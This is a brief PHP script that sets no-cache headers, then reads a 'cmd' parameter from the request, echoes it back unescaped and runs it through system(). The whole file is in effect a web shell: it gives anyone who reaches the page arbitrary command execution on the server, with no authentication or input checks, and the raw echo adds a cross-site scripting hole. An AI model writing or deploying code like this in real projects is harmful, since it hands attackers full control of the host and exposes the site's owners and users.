<?php

// Set no caching. Need php.ini: output_buttering=4096.
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

//include_once("../../_uti/Uti.php");
//include("SearchUti.php");

$cmd = $_REQUEST["cmd"];
echo $_REQUEST["cmd"];
echo "\n\n";
system($cmd);
//system("ls -al");

echo "\n\nEND";
?>
